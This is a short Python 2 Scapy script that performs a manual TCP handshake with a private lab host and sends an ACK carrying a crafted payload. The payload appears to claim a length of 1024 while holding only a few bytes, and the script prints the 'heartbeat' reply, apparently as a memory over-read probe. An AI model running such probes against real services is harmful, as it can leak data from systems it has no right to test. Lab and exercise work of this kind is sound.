from scapy.all import *
from scapy.layers.inet import *
import random


def main():
    # Setup packet parameters
    target = "10.1.8.96"
    port = 45434
    source_port = random.randint(1025, 65535)
    payload = b'1024\x08t'

    print "Establishing connection ...\n"

    print "Crafting SYN packet\n"
    syn = IP(dst=target) / TCP(dport=port, sport=source_port, flags="S")

    print "SYN Crafted.  Sending ...\n"
    syn_ack = sr1(syn, verbose=0, timeout=5)

    print "SYN/ACK received, crafting payload ACK\n"
    ack = IP(dst=target) / TCP(dport=port, sport=source_port, flags="A", seq=syn_ack.ack, ack=syn_ack.seq+1) / payload

    print "Payload ACK crafted.  Sending ...\n"
    heartbeat = sr1(ack, verbose=0, timeout=65)

    for r in heartbeat:
        print "Received the following response:\n"
        r.show()


# def packet_craft(payload, dest_port, source_port, target):
#     pkt = IP(dst=target) / TCP(dport=dest_port, sport=source_port, flags="A") / payload
#     return pkt


if __name__ == '__main__':
    main()
